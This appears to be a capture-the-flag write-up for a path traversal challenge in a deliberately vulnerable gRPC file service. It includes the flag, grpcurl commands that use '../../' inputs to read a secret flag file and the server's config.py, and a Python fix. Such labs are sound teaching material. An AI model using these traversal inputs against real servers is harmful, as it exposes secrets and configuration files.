# Challenge 06 — Path Traversal

**Category:** Injection
**Difficulty:** 🟡 Medium
**Service:** `FileService`
**Flag:** `FLAG{p4th_tr4v3rs4l_gr0und_z3r0_4pp}`

---

## Background

Path traversal (also called directory traversal) allows an attacker to escape a restricted directory by including `../` sequences in file paths. If the server uses `os.path.join(base, user_input)` without normalizing and validating the result, the attacker can read any file the server process can access.

---

## Steps

```bash
# Login
TOKEN=$(grpcurl -plaintext localhost:50051 dvgrpc.AuthService/Login \
  -d '{"username":"alice","password":"alice123"}' | jq -r .token)

# Normal file listing
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.FileService/ListFiles -d '{"directory":"."}'

# Traverse to /app/secret/
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.FileService/ListFiles \
  -d '{"directory":"../../secret"}'

# Read the flag file
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.FileService/ReadFile \
  -d '{"filename":"../../secret/path_flag.txt"}'

# Bonus: read server config (all secrets)
grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
  localhost:50051 dvgrpc.FileService/ReadFile \
  -d '{"filename":"../../server/config.py"}'
```

---

## Fix

```python
import os

def ReadFile(self, request, context):
    # Resolve and check prefix
    requested = os.path.realpath(os.path.join(FILE_BASE_DIR, request.filename))
    if not requested.startswith(os.path.realpath(FILE_BASE_DIR) + os.sep):
        context.abort(grpc.StatusCode.PERMISSION_DENIED, "Access denied.")
        return
    # safe to open
```
